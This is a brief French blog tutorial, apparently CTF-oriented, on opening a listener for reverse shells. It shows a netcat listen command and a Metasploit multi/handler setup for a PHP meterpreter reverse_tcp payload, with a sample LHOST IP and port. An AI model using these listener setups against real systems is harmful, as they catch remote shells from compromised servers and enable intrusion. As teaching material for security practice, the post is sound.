---
layout: post
section-type: post
title: Se mettre sous écoute sur un port
category: exploitation web
tags: [ 'reverse shell', 'Se mettre sous écoute sur un port', 'hacking', 'ctf' ]
---

---------------------------------------------
#### Mise en garde
Dans cet article, je vous montre un simple usage de netcat et meterpreter. Pour des besoins plus avancés, RTFM :p 

---------------------------------------------

#### Pré requis 
1-Avoir installer meterpreter pour la Méthode 2 <br/>

---------------------------------------------
#### Méthode 1: Utiliser netcat
  <pre><code data-trim class="yaml">
      #se mette sous écoute sur le port 1234
      netcat -lvp 1234 
  </code></pre> <br/>
     
---------------------------------------------
#### Méthode 2: Utiliser meterpreter
  <pre><code data-trim class="yaml">
      #se mette sous écoute sur le port 1234 et l'IP 10.23.201.17 en utilisant le payload php
      msfconsole
      use exploit/multi/handler
      set payload php/meterpreter/reverse_tcp
      set LHOST 10.23.201.17
      set LPORT 1234
      run
  </code></pre> <br/>
     
---------------------------------------------

			
